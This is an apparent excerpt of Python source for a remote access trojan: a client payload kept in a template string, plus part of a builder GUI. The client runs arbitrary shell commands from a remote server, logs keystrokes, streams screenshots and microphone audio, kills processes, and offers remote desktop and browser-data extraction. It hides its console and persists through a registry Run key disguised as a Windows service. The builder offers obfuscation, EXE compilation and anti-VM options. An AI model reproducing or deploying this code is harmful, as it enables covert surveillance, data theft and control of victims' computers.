            self.client_socket.send(struct.pack('Q', len(error_data)))
            self.client_socket.send(error_data)
        except:
            pass
    
    def format_size(self, size_bytes):
        """Convert byte size to human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} PB"
    
    
class ClientProcessManager:
    """Handler for process-related operations on the client side"""
    
    def __init__(self, client_socket, buffer_size=4096):
        self.client_socket = client_socket
        self.buffer_size = buffer_size
    
    def handle_process_command(self, command):
        """Process process-related commands from the server"""
        # Convert bytes to string if necessary
        if isinstance(command, bytes):
            command = command.decode('utf-8')
            
        print(f"[*] Handling process command: {command}")
        
        if command == "PROCESS_LIST":
            print("[*] Sending process list to server")
            self.send_process_list()
        elif command.startswith("PROCESS_DETAILS|"):
            # Extract PID from command
            try:
                pid = int(command.split('|')[1])
                self.send_process_details(pid)
            except (IndexError, ValueError) as e:
                print(f"[!] Error parsing process details command: {e}")
                self.send_error("Invalid process details command")
        elif command.startswith("KILL_PROCESS|"):
            # Extract PID from command
            try:
                pid = int(command.split('|')[1])
                self.kill_process(pid)
            except (IndexError, ValueError) as e:
                print(f"[!] Error parsing kill process command: {e}")
                self.client_socket.send("ERROR: Invalid kill process command".encode())
    
    def send_process_list(self):
        """Send a list of all running processes to the server"""
        try:
            print("[*] Gathering process list data")
            
            # Get system-wide CPU and memory usage
            system_info = {
                'cpu_percent': psutil.cpu_percent(interval=0.5),
                'memory_percent': psutil.virtual_memory().percent,
                'memory_used': psutil.virtual_memory().used,
                'memory_total': psutil.virtual_memory().total
            }
            
            # Get process list (first pass to initialize CPU measurement)
            processes = []
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    # First call to cpu_percent for initialization
                    proc.cpu_percent(interval=None)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
            
            # Wait to get accurate CPU measurements
            time.sleep(0.5)
            
            # Now collect the actual data
            print("[*] Collecting detailed process information")
            for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'memory_info', 'num_threads', 'create_time']):
                try:
                    pinfo = proc.as_dict(attrs=['pid', 'name', 'username', 'status', 'memory_info', 'num_threads', 'create_time'])
                    
                    # Get CPU usage
                    try:
                        cpu_percent = proc.cpu_percent(interval=None)
                    except Exception as e:
                        cpu_percent = 0
                        print(f"[!] Error getting CPU percent: {e}")
                    
                    # Format data for transmission
                    process_data = {
                        'pid': pinfo['pid'],
                        'name': pinfo['name'],
                        'username': pinfo['username'] if pinfo['username'] else 'Unknown',
                        'status': pinfo['status'],
                        'cpu_percent': cpu_percent,
                        'memory': pinfo['memory_info'].rss if pinfo['memory_info'] else 0,
                        'threads': pinfo['num_threads'],
                        'create_time': datetime.fromtimestamp(pinfo['create_time']).strftime('%Y-%m-%d %H:%M:%S') if pinfo['create_time'] else 'Unknown'
                    }
                    
                    processes.append(process_data)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                    # Skip this process
                    continue
                except Exception as e:
                    print(f"[!] Unexpected error processing process: {e}")
                    continue
            
            # Create the full response
            response = {
                'system': system_info,
                'processes': processes
            }
            
            # Convert to JSON and send
            print(f"[*] Sending data for {len(processes)} processes")
            json_data = json.dumps(response).encode('utf-8')
            
            # Debug: Print the first few characters of the JSON
            print(f"[*] JSON data starts with: {json_data[:100]}...")
            print(f"[*] Total JSON size: {len(json_data)} bytes")
            
            # Send size first
            size_header = struct.pack('Q', len(json_data))
            bytes_sent = self.client_socket.send(size_header)
            print(f"[*] Sent size header ({bytes_sent} bytes)")
            
            # Add a small delay to ensure packets are properly separated
            time.sleep(0.05)
            
            # Send the process list data in chunks
            total_sent = 0
            while total_sent < len(json_data):
                chunk = json_data[total_sent:total_sent + self.buffer_size]
                bytes_sent = self.client_socket.send(chunk)
                total_sent += bytes_sent
                
                # If no bytes were sent, we have a connection issue
                if bytes_sent == 0:
                    raise RuntimeError("Socket connection broken")
                
                print(f"[*] Sent chunk of {bytes_sent} bytes, total sent: {total_sent}/{len(json_data)}")
            
            print("[*] Process list sent successfully")
            
        except Exception as e:
            error_msg = f"Error getting process list: {str(e)}"
            print(f"[!] {error_msg}")
            self.send_error(error_msg)
    
    def send_process_details(self, pid):
        """Send detailed information about a specific process"""
        try:
            # Check if process exists
            if not psutil.pid_exists(pid):
                self.send_error(f"Process with PID {pid} not found")
                return
            
            # Get process info
            proc = psutil.Process(pid)
            
            try:
                # Get basic process info
                process_info = {
                    'pid': proc.pid,
                    'name': proc.name(),
                    'exe': proc.exe() if hasattr(proc, 'exe') else 'Unknown',
                    'username': proc.username() if hasattr(proc, 'username') else 'Unknown',
                    'status': proc.status() if hasattr(proc, 'status') else 'Unknown',
                    'cpu_percent': proc.cpu_percent(interval=0.5),
                    'memory': proc.memory_info().rss if hasattr(proc, 'memory_info') else 0,
                    'threads': proc.num_threads() if hasattr(proc, 'num_threads') else 0,
                    'create_time': datetime.datetime.fromtimestamp(proc.create_time()).strftime('%Y-%m-%d %H:%M:%S') if hasattr(proc, 'create_time') else 'Unknown'
                }
                
                # Get command line
                try:
                    cmdline = ' '.join(proc.cmdline()) if hasattr(proc, 'cmdline') else 'Unknown'
                    process_info['cmdline'] = cmdline
                except (psutil.AccessDenied, psutil.ZombieProcess):
                    process_info['cmdline'] = 'Access Denied'
                
                # Get network connections
                try:
                    if hasattr(proc, 'connections'):
                        connections = []
                        for conn in proc.connections():
                            if conn.laddr and len(conn.laddr) >= 2:
                                local = f"{conn.laddr[0]}:{conn.laddr[1]}"
                                if conn.raddr and len(conn.raddr) >= 2:
                                    remote = f"{conn.raddr[0]}:{conn.raddr[1]}"
                                    connections.append(f"{local} -> {remote} ({conn.status})")
                                else:
                                    connections.append(f"{local} ({conn.status})")
                        process_info['connections'] = connections
                except (psutil.AccessDenied, psutil.ZombieProcess):
                    process_info['connections'] = ['Access Denied']
                
                # Get open files
                try:
                    if hasattr(proc, 'open_files'):
                        open_files = [f.path for f in proc.open_files()]
                        process_info['open_files'] = open_files
                except (psutil.AccessDenied, psutil.ZombieProcess):
                    process_info['open_files'] = ['Access Denied']
                
                # Convert to JSON and send
                json_data = json.dumps(process_info).encode('utf-8')
                
                # Send size first
                self.client_socket.send(struct.pack('Q', len(json_data)))
                
                # Send the process data in chunks
                total_sent = 0
                while total_sent < len(json_data):
                    chunk = json_data[total_sent:total_sent + self.buffer_size]
                    self.client_socket.send(chunk)
                    total_sent += len(chunk)
                
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                self.send_error(f"Error accessing process {pid}: {str(e)}")
        
        except Exception as e:
            self.send_error(f"Error getting process details: {str(e)}")
    
    def kill_process(self, pid):
        """Terminate a process with the given PID"""
        try:
            # Check if process exists
            if not psutil.pid_exists(pid):
                self.client_socket.send(f"ERROR: Process with PID {pid} not found".encode())
                return
            
            # Try to terminate the process
            proc = psutil.Process(pid)
            proc_name = proc.name()
            
            # Terminate process
            proc.terminate()
            
            # Wait briefly for the process to terminate
            gone, still_alive = psutil.wait_procs([proc], timeout=3)
            
            # If still alive, try to kill it
            if still_alive:
                proc.kill()
                gone, still_alive = psutil.wait_procs([proc], timeout=3)
            
            if still_alive:
                self.client_socket.send(f"ERROR: Could not terminate process {pid} ({proc_name})".encode())
            else:
                self.client_socket.send(f"SUCCESS: Process {pid} ({proc_name}) terminated".encode())
        
        except psutil.AccessDenied:
            self.client_socket.send(f"ERROR: Access denied when terminating process {pid}".encode())
        except psutil.NoSuchProcess:
            self.client_socket.send(f"ERROR: Process with PID {pid} not found".encode())
        except Exception as e:
            self.client_socket.send(f"ERROR: {str(e)}".encode())
    
    def send_error(self, error_msg):
        """Send an error message back to the server"""
        try:
            error_data = f"ERROR: {error_msg}".encode('utf-8')
            self.client_socket.send(struct.pack('Q', len(error_data)))
            self.client_socket.send(error_data)
        except:
            pass
        

class RATClient:
    def __init__(self, server_ip=SERVER_IP, server_port=SERVER_PORT):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_address = (self.server_ip, self.server_port)
        self.client_socket = None
        self.connected = False
        self.stop_threads = False
        
        # Flags for various features
        self.screen_capture_active = False
        self.audio_spy_active = False
        self.keylogger_active = False
        
        # Thread trackers
        self.active_threads = []
        
        # Initialize keyboard listener but don't start it yet
        self.key_listener = None
        self.keys_recorded = []
        
        # File transfer handler (will be initialized after connection)
        self.file_handler = None
        self.process_manager = None
        
        self.advanced_monitoring = None
        
    def connect(self):
        """Establish connection to the server"""
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect(self.server_address)
            self.connected = True
            print(f"[*] Connected to {self.server_ip}:{self.server_port}")
            
            # Initialize file handler
            self.file_handler = ClientFileHandler(self.client_socket, buffer_size=BUFFER_SIZE)
            self.process_manager = ClientProcessManager(self.client_socket, buffer_size=BUFFER_SIZE)
            self.advanced_monitoring = AdvancedMonitoring(self.client_socket, buffer_size=BUFFER_SIZE)
            # Start the main command handler thread
            self.command_thread = threading.Thread(target=self.handle_commands)
            self.command_thread.daemon = True
            self.command_thread.start()
            self.active_threads.append(self.command_thread)
            
            return True
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return False
    
    def reconnect(self):
        """Attempt to reconnect to the server"""
        while not self.connected and not self.stop_threads:
            print("[*] Attempting to reconnect...")
            try:
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect(self.server_address)
                self.connected = True
                print(f"[*] Reconnected to {self.server_ip}:{self.server_port}")
                
                # Reinitialize file handler
                self.file_handler = ClientFileHandler(self.client_socket, buffer_size=BUFFER_SIZE)
                self.process_manager = ClientProcessManager(self.client_socket, buffer_size=BUFFER_SIZE)
                # Restart command handler
                self.command_thread = threading.Thread(target=self.handle_commands)
                self.command_thread.daemon = True
                self.command_thread.start()
                self.active_threads.append(self.command_thread)
                
                break
            except Exception as e:
                print(f"[!] Reconnection failed: {e}")
                time.sleep(5)  # Wait before next attempt
    
    def disconnect(self):
        """Disconnect from the server and cleanup resources"""
        self.stop_threads = True
        self.connected = False
        
        # Stop all active features
        self.screen_capture_active = False
        self.audio_spy_active = False
        self.stop_keylogger()
        
        # Close socket
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
            self.client_socket = None
        
        print("[*] Disconnected from server")
    
    def handle_commands(self):
        """Main loop for handling server commands"""
        while self.connected and not self.stop_threads:
            try:
                # Wait for commands from the server
                data = self.client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
                print(data)
                if not data:
                    # Connection lost
                    print("[!] Connection to server lost")
                    self.connected = False
                    self.reconnect()
                    break
                
                # Process different command types
                if data == 'GETHOSTNAME':
                    self.send_hostname()
                
                elif data.startswith('CMD_COMMAND_'):
                    # Execute shell command
                    command = data[12:]  # Remove prefix
                    self.execute_command(command)
                
                elif data == 'SCRSHOOT':
                    # Start screen capture
                    if not self.screen_capture_active:
                        self.screen_capture_active = True
                        screen_thread = threading.Thread(target=self.screen_capture)
                        screen_thread.daemon = True
                        screen_thread.start()
                        self.active_threads.append(screen_thread)
                
                elif data == 'STOP_SCRSHOOT':
                    # Stop screen capture
                    self.screen_capture_active = False
                
                elif data == 'AUDIO_SPY':
                    # Start audio spy
                    if not self.audio_spy_active:
                        self.audio_spy_active = True
                        audio_thread = threading.Thread(target=self.audio_spy)
                        audio_thread.daemon = True
                        audio_thread.start()
                        self.active_threads.append(audio_thread)
                
                elif data == 'CLOSE_AUDIO_SPY':
                    # Stop audio spy
                    self.audio_spy_active = False
                
                elif data == 'KEY_REC':
                    # Start keylogger
                    self.start_keylogger()
                
                elif data == 'STOP_KEY_REC':
                    # Stop keylogger
                    self.stop_keylogger()
                
                # File transfer commands
                elif data.startswith('FILE_'):
                    print(f"[*] Handling file command: {data[:20]}...")
                    if self.file_handler:
                        self.file_handler.handle_file_command(data)
                    else:
                        print("[!] File handler not initialized")
                
                # Process manager commands
                elif data == 'PROCESS_LIST' or data == b'PROCESS_LIST':
                    print('[*] Received PROCESS_LIST command')
                    if self.process_manager:
                        self.process_manager.handle_process_command(data)
                    else:
                        print("[!] Process manager not initialized")

                elif data.startswith('PROCESS_DETAILS|'):
                    print(f'[*] Received process details command: {data}')
                    if self.process_manager:
                        self.process_manager.handle_process_command(data)
                    else:
                        print("[!] Process manager not initialized")

                elif data.startswith('KILL_PROCESS|'):
                    print(f'[*] Received kill process command: {data}')
                    if self.process_manager:
                        self.process_manager.handle_process_command(data)
                    else:
                        print("[!] Process manager not initialized")
            
                elif data == 'START_NETWORK_CAPTURE' or data == 'STOP_NETWORK_CAPTURE' or \
                data == 'GET_NETWORK_CAPTURE' or data == 'START_CLIPBOARD_MONITORING' or \
                data == 'STOP_CLIPBOARD_MONITORING' or data == 'GET_CLIPBOARD_DATA' or \
                data == 'EXTRACT_BROWSER_DATA' or data == 'START_DNS_MONITORING' or \
                data == 'STOP_DNS_MONITORING' or data == 'GET_DNS_HISTORY' or \
                data == 'GET_SYSTEM_INFO':
                    print(f'[*] Received advanced monitoring command: {data}')
                    if self.advanced_monitoring:
                        self.advanced_monitoring.handle_monitoring_command(data)
                    else:
                        print("[!] Advanced monitoring not initialized")
                        
                        
                elif data.startswith('START_REMOTE_DESKTOP'):
                    # Format: START_REMOTE_DESKTOP|port_number
                    parts = data.split('|')
                    if len(parts) >= 2:
                        try:
                            control_port = int(parts[1])
                            
                            # Initialize remote desktop control if not already
                            if not hasattr(self, 'remote_desktop'):
                                self.remote_desktop = RemoteDesktopControl(self.client_socket)
                            
                            # Get screen dimensions to send back to server
                            screen_width, screen_height = pyautogui.size()
                            
                            # Start the remote desktop control
                            success = self.remote_desktop.start(control_port)
                            
                            if success:
                                # Send success response with screen dimensions
                                response = f"REMOTE_DESKTOP_STARTED|{screen_width}x{screen_height}"
                                self.client_socket.send(response.encode())
                            else:
                                self.client_socket.send(b"REMOTE_DESKTOP_ERROR")
                                
                        except Exception as e:
                            print(f"[!] Error starting remote desktop: {e}")
                            self.client_socket.send(f"REMOTE_DESKTOP_ERROR|{str(e)}".encode())
                    else:
                        self.client_socket.send(b"REMOTE_DESKTOP_ERROR|Missing port number")
                
                elif data == 'STOP_REMOTE_DESKTOP':
                    if hasattr(self, 'remote_desktop'):
                        try:
                            self.remote_desktop.stop()
                            self.client_socket.send(b"REMOTE_DESKTOP_STOPPED")
                        except Exception as e:
                            print(f"[!] Error stopping remote desktop: {e}")
                            self.client_socket.send(f"REMOTE_DESKTOP_ERROR|{str(e)}".encode())
                    else:
                        self.client_socket.send(b"REMOTE_DESKTOP_NOT_ACTIVE")
            except Exception as e:
                print(f"[!] Error handling commands: {e}")
                self.connected = False
                self.reconnect()
                break
    
    def send_hostname(self):
        """Send hostname to the server"""
        try:
            hostname = socket.gethostname()
            self.client_socket.send(hostname.encode())
        except Exception as e:
            print(f"[!] Error sending hostname: {e}")
    
    def execute_command(self, command):
        """Execute a shell command and return the result"""
        try:
            # Determine the correct shell to use based on OS
            if os.name == 'nt':  # Windows
                shell = True
            else:  # Unix/Linux/Mac
                shell = False
            
            # Run the command and capture output
            result = subprocess.run(command, shell=shell, stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE, text=True, timeout=10)
            
            # Combine stdout and stderr
            output = result.stdout + result.stderr
            
            if not output:
                output = "Command executed successfully (no output)"
            
            # Send back the size first (as expected by the server)
            output_bytes = output.encode('utf-8', errors='ignore')
            size = struct.pack('Q', len(output_bytes))
            self.client_socket.send(size)
            
            # Then send the actual output
            self.client_socket.sendall(output_bytes)
            
        except subprocess.TimeoutExpired:
            error_msg = "Command timed out after 10 seconds"
            size = struct.pack('Q', len(error_msg.encode()))
            self.client_socket.send(size)
            self.client_socket.send(error_msg.encode())
        
        except Exception as e:
            error_msg = f"Error executing command: {e}"
            size = struct.pack('Q', len(error_msg.encode()))
            self.client_socket.send(size)
            self.client_socket.send(error_msg.encode())
    
    def screen_capture(self):
        """Capture screen and send to server via UDP"""
        print("[*] Starting screen capture")
        try:
            # Create UDP socket for sending screenshots
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.screen_capture_active and self.connected and not self.stop_threads:
                try:
                    # Capture screenshot using PIL
                    screenshot = ImageGrab.grab()
                    
                    # Convert to bytes using OpenCV
                    screenshot_np = np.array(screenshot)
                    frame = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
                    
                    # Encode and compress the image
                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, SCREENSHOT_QUALITY])
                    compressed_data = zlib.compress(buffer)
                    
                    # First send the size of the data
                    size = struct.pack('Q', len(compressed_data))
                    udp_socket.sendto(size, self.server_address)
                    
                    # Send the compressed data in chunks if needed
                    data_to_send = compressed_data
                    while data_to_send:
                        chunk = data_to_send[:MAX_UDP_SIZE]
                        udp_socket.sendto(chunk, self.server_address)
                        data_to_send = data_to_send[MAX_UDP_SIZE:]
                    
                    # Sleep briefly before next capture
                    time.sleep(SCREENSHOT_INTERVAL)
                
                except Exception as e:
                    print(f"[!] Error during screen capture: {e}")
                    time.sleep(1)  # Wait before retry
            
            udp_socket.close()
            print("[*] Screen capture stopped")
        
        except Exception as e:
            print(f"[!] Screen capture thread error: {e}")
    
    def audio_spy(self):
        """Capture audio from microphone and send to server via UDP"""
        print("[*] Starting audio capture")
        try:
            # Setup PyAudio
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16,
                          channels=2,
                          rate=44100,
                          input=True)
            
            # Create UDP socket for sending audio
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.audio_spy_active and self.connected and not self.stop_threads:
                try:
                    # Read audio chunk
                    data = stream.read(4096, exception_on_overflow=False)
                    packed_size = struct.pack('Q', len(data))
                    # Send directly via UDP
                    udp_socket.sendto(packed_size, self.server_address)
                    udp_socket.sendto(data, self.server_address)
                    
                except Exception as e:
                    print(f"[!] Error during audio capture: {e}")
                    time.sleep(0.1)  # Small delay before retry
            
            # Cleanup
            stream.stop_stream()
            stream.close()
            p.terminate()
            udp_socket.close()
            print("[*] Audio capture stopped")
        
        except Exception as e:
            print(f"[!] Audio capture thread error: {e}")
    
    def on_key_press(self, key):
        """Callback for key press events"""
        if not self.keylogger_active:
            return False  # Stop listener
        
        try:
            # Convert key to string representation
            if hasattr(key, 'char'):
                # Regular character
                if key.char:
                    keydata = key.char
                else:
                    keydata = '[special]'
            elif key == keyboard.Key.space:
                keydata = ' '
            elif key == keyboard.Key.enter:
                keydata = '\n'
            elif key == keyboard.Key.tab:
                keydata = '\t'
            elif key == keyboard.Key.backspace:
                keydata = ''  # Special character for backspace
            else:
                # Special key (like shift, ctrl, etc.)
                keydata = f"[{key}]"
            
            # Send key to server
            if self.connected and self.client_socket:
                self.client_socket.send(keydata.encode('utf-8', errors='ignore'))
        
        except Exception as e:
            print(f"[!] Error in keylogger: {e}")
        
        return True  # Continue listener
    
    def start_keylogger(self):
        """Start the keylogger"""
        if not self.key_listener:
            print("[*] Starting keylogger")
            self.keylogger_active = True
            
            # Start keyboard listener in a separate thread
            self.key_listener = keyboard.Listener(on_press=self.on_key_press)
            self.key_listener.daemon = True
            self.key_listener.start()
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        if self.key_listener:
            print("[*] Stopping keylogger")
            self.keylogger_active = False
            
            try:
                self.key_listener.stop()
                self.key_listener = None
            except:
                pass

def hide_console():
    if os.name == 'nt':  # Only on Windows
        try:
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)  # SW_HIDE = 0
        except Exception as e:
            print(f"[!] Error hiding console: {e}")

def run_on_startup():
    """Add the client to startup (platform dependent)"""
    try:
        if os.name == 'nt':  # Windows
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            
            # Add to registry for startup
            import winreg
            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            
        print("[*] Added to startup successfully")
        
    except Exception as e:
        print(f"[!] Error adding to startup: {e}")

def is_admin():
    try:
        if os.name == 'nt':  # Windows
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def main():
    # Configuration
    HIDE_CONSOLE = False  # Set to True to hide console window
    ADD_TO_STARTUP = False  # Set to True to add to startup
    REQUEST_ADMIN = False  # Set to True to request admin privileges if not already running as admin
    
    # Check for admin rights if requested
    if REQUEST_ADMIN and not is_admin():
        print("[!] Not running as administrator. Requesting elevation...")
        try:
            if os.name == 'nt':  # Windows
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            else:
                # On Unix systems, we'd typically use sudo, but that requires a password
                # This is just a placeholder and won't actually work in most cases
                os.system(f"sudo {sys.executable} {' '.join(sys.argv)}")
            sys.exit(0)
        except Exception as e:
            print(f"[!] Failed to elevate privileges: {e}")
    
    # Hide console if requested
    if HIDE_CONSOLE:
        hide_console()
    
    # Add to startup if requested
    if ADD_TO_STARTUP:
        run_on_startup()
    
    # Create and run the client
    client = RATClient(SERVER_IP, SERVER_PORT)
    
    # Attempt initial connection
    connected = client.connect()
    
    # Main loop with reconnection attempts
    while not client.stop_threads:
        try:
            if not client.connected:
                print("[*] Attempting to connect...")
                client.connect()
                time.sleep(5)  # Wait before next attempt
            else:
                time.sleep(1)  # Just wait while connected
        except KeyboardInterrupt:
            print("[*] Keyboard interrupt detected, exiting...")
            client.disconnect()
            break
        except Exception as e:
            print(f"[!] Error in main loop: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
    '''
    
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.client_template_path = "client_template.py"
        self.client_code = self.c_code
        self.obfuscation_level = 1
        self.persistence_enabled = False
        self.hide_console = False
        self.mutex_name = f"rat_client_{str(uuid.uuid4())[:8]}"
        self.startup_method = "registry"
        self.anti_vm = False
        self.build_logs = []
        self.is_building = False
        
        
        # Default build options
        self.build_options = {
            "host": rat_app.ip if hasattr(rat_app, 'ip') else "127.0.0.1",
            "port": rat_app.port if hasattr(rat_app, 'port') else 4444,
            "file_name": "client.py",
            "output_dir": os.path.join(os.path.expanduser("~"), "Desktop"),
            "icon_path": "",
            "obfuscation": 1,
            "compile_to_exe": True,
            "persistence": False,
            "persistence_method": "registry",
            "startup_name": "Windows Service",
            "hide_console": True,
            "anti_vm": False,
            "mutex_enabled": True,
            "mutex_name": self.mutex_name,
        }
        
        # Setup UI
        self.setup_ui()
        
        # Initially load template
        # self.load_client_template()
    
    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return self.rat_app.THEMES[theme_name]
    
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available."""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            theme_manager = self.rat_app.theme_manager
            
            # Register main frame
            theme_manager.track_widget(self.builder_frame)
            
            # Register each frame, button, etc.
            for widget in self.theme_widgets:
                theme_manager.track_widget(widget)
            
            # Register text widgets
            for text_widget in self.theme_text_widgets:
                theme_manager.track_widget(text_widget, "scrolledtext")
    
    def setup_ui(self):
        """Set up the client builder UI"""
        theme = self.get_theme_colors()
        
        # Lists to track widgets for theme management
        self.theme_widgets = []
        self.theme_text_widgets = []
        
        # Create main builder frame
        self.builder_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.builder_frame, text="Client Builder")
        
        # Split into left config panel and right preview/log panel
        left_panel = ctk.CTkFrame(self.builder_frame)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.theme_widgets.append(left_panel)
        
        right_panel = ctk.CTkFrame(self.builder_frame)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.theme_widgets.append(right_panel)
        
        # === LEFT PANEL - Configuration options ===
        # Connection settings
        connection_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
        connection_frame.pack(fill=tk.X, padx=5, pady=5)
        self.theme_widgets.append(connection_frame)
        
        connection_label = ctk.CTkLabel(connection_frame, text="Connection Settings", 
                                      font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"))
        connection_label.pack(anchor="w", padx=10, pady=5)
        
        # Host input
        host_frame = ctk.CTkFrame(connection_frame, fg_color="transparent")
        host_frame.pack(fill=tk.X, padx=10, pady=5)
        
        host_label = ctk.CTkLabel(host_frame, text="Host:", width=100)
        host_label.pack(side=tk.LEFT, padx=5)
        
        self.host_entry = ctk.CTkEntry(host_frame, width=200)
        self.host_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.host_entry.insert(0, self.build_options["host"])
        self.theme_widgets.append(self.host_entry)
        
        # Port input
        port_frame = ctk.CTkFrame(connection_frame, fg_color="transparent")
        port_frame.pack(fill=tk.X, padx=10, pady=5)
        
        port_label = ctk.CTkLabel(port_frame, text="Port:", width=100)
        port_label.pack(side=tk.LEFT, padx=5)
        
        self.port_entry = ctk.CTkEntry(port_frame, width=200)
        self.port_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.port_entry.insert(0, str(self.build_options["port"]))
        self.theme_widgets.append(self.port_entry)
        
        # Use current settings button
        current_settings_btn = ctk.CTkButton(connection_frame, text="Use Current Server Settings", 
                                          command=self.use_current_settings,
                                          fg_color=theme["button_color"],
                                          hover_color=theme["hover_color"])
        current_settings_btn.pack(pady=10)
        self.theme_widgets.append(current_settings_btn)
        
        # Build settings
        build_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
        build_frame.pack(fill=tk.X, padx=5, pady=5)
        self.theme_widgets.append(build_frame)
        
        build_label = ctk.CTkLabel(build_frame, text="Build Settings", 
                                 font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"))
        build_label.pack(anchor="w", padx=10, pady=5)
        
        # Output file name
        filename_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        filename_frame.pack(fill=tk.X, padx=10, pady=5)
        
        filename_label = ctk.CTkLabel(filename_frame, text="File Name:", width=100)
        filename_label.pack(side=tk.LEFT, padx=5)
        
        self.filename_entry = ctk.CTkEntry(filename_frame, width=200)
        self.filename_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.filename_entry.insert(0, self.build_options["file_name"])
        self.theme_widgets.append(self.filename_entry)
        
        # Output directory
        outdir_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        outdir_frame.pack(fill=tk.X, padx=10, pady=5)
        
        outdir_label = ctk.CTkLabel(outdir_frame, text="Output Directory:", width=100)
        outdir_label.pack(side=tk.LEFT, padx=5)
        
        self.outdir_entry = ctk.CTkEntry(outdir_frame, width=200)
        self.outdir_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.outdir_entry.insert(0, self.build_options["output_dir"])
        self.theme_widgets.append(self.outdir_entry)
        
        browse_btn = ctk.CTkButton(outdir_frame, text="Browse", 
                                 command=self.browse_output_dir,
                                 width=70,
                                 fg_color=theme["button_color"],
                                 hover_color=theme["hover_color"])
        browse_btn.pack(side=tk.RIGHT, padx=5)
        self.theme_widgets.append(browse_btn)
        
        # Icon path
        icon_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        icon_frame.pack(fill=tk.X, padx=10, pady=5)
        
        icon_label = ctk.CTkLabel(icon_frame, text="Icon File:", width=100)
        icon_label.pack(side=tk.LEFT, padx=5)
        
        self.icon_entry = ctk.CTkEntry(icon_frame, width=200)
        self.icon_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.icon_entry.insert(0, self.build_options["icon_path"])
        self.theme_widgets.append(self.icon_entry)
        
        icon_browse_btn = ctk.CTkButton(icon_frame, text="Browse", 
                                      command=self.browse_icon_file,
                                      width=70,
                                      fg_color=theme["button_color"],
                                      hover_color=theme["hover_color"])
        icon_browse_btn.pack(side=tk.RIGHT, padx=5)
        self.theme_widgets.append(icon_browse_btn)
        
        # Compile option
        compile_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        compile_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.compile_var = tk.BooleanVar(value=self.build_options["compile_to_exe"])
        compile_checkbox = ctk.CTkCheckBox(compile_frame, text="Compile to EXE", 
                                         variable=self.compile_var,
                                         onvalue=True, offvalue=False,
                                         checkbox_width=20,
                                         checkbox_height=20,
                                         fg_color=theme["accent_color"])
        compile_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(compile_checkbox)
        
        # Obfuscation level
        obfuscation_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        obfuscation_frame.pack(fill=tk.X, padx=10, pady=5)
        
        obfuscation_label = ctk.CTkLabel(obfuscation_frame, text="Obfuscation Level:")
        obfuscation_label.pack(side=tk.LEFT, padx=5)
        
        self.obfuscation_var = tk.IntVar(value=self.build_options["obfuscation"])
        
        obfuscation_slider = ctk.CTkSlider(obfuscation_frame, from_=0, to=3, 
                                         variable=self.obfuscation_var,
                                         number_of_steps=3,
                                         width=150)
        obfuscation_slider.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(obfuscation_slider)
        
        self.obfuscation_value = ctk.CTkLabel(obfuscation_frame, text=str(self.obfuscation_var.get()))
